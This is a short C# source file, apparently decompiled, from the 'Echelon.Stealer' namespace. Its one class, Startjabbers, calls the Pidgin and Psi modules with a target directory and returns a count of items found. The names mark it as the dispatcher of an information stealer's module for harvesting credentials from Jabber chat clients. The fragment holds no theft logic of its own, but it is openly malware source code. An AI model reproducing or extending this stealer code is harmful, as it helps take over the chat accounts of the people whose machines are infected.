using System;

namespace Echelon.Stealer.Jabber
{
	// Token: 0x0200001C RID: 28
	internal class Startjabbers
	{
		// Token: 0x06000070 RID: 112 RVA: 0x00008A31 File Offset: 0x00006C31
		public static int Start(string Echelon_Dir)
		{
			Pidgin.Start(Echelon_Dir);
			Psi.Start(Echelon_Dir);
			return Startjabbers.count;
		}

		// Token: 0x0400005B RID: 91
		public static int count;
	}
}
